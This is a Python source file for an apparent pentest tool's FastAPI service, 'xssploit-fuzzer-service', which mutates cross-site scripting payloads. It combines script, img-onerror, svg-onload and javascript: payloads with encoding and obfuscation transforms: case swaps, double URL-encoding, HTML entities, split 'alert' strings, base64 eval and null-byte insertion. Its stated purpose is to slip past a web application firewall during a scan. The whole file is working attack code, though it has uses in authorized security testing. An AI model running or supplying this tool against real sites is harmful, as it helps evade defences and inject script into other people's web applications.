"""
XSSPLOIT python fuzzer-service (optional, port 8002).

Generates mutation batches for the TS engine via a simple grammar-driven
fuzzer: base payloads × encoder chains × structural transforms. Useful when
the curated library gets filtered by a WAF mid-scan.
"""
from __future__ import annotations

import base64
import random
import urllib.parse

from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI(title="xssploit-fuzzer-service", version="5.0.0")
random.seed()

BASES = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "'-alert(1)-'",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]

TRANSFORMS = [
    lambda p: p.replace("script", "ScRiPt"),
    lambda p: p.replace(" ", "/"),
    lambda p: urllib.parse.quote(p, safe=""),
    lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
    lambda p: "".join(f"&#{ord(c)};" if c in "<>\"'" else c for c in p),
    lambda p: p.replace("alert", "window['al'+'ert']"),
    lambda p: p.replace("alert(1)", "eval(atob('%s'))" % base64.b64encode(b"alert(1)").decode()),
    lambda p: p.replace("onerror", "onerror\x0c"),
    lambda p: p + "<!--",
    lambda p: p.replace("<", "<%00") if "%00" not in p else p,
]


class FuzzRequest(BaseModel):
    count: int = 50
    seed_payloads: list[str] = []


class FuzzResponse(BaseModel):
    payloads: list[str]


@app.get("/health")
def health() -> dict:
    return {"status": "ok", "service": "xssploit-fuzzer-service", "version": "5.0.0"}


@app.post("/fuzz", response_model=FuzzResponse)
def fuzz(req: FuzzRequest) -> FuzzResponse:
    pool = req.seed_payloads or BASES
    out: set[str] = set()
    count = max(1, min(500, req.count))
    while len(out) < count:
        base = random.choice(pool)
        mutated = base
        for transform in random.sample(TRANSFORMS, k=random.randint(1, 3)):
            try:
                mutated = transform(mutated)
            except Exception:
                continue
        if mutated:
            out.add(mutated)
    return FuzzResponse(payloads=sorted(out))


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8002)
